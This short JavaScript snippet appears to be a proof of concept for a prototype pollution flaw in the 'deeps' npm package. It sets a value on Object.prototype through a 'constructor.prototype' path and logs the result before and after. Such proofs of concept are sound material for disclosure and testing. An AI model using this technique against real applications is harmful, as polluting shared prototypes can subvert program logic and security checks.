var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const deeps = require('deeps');
deeps.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);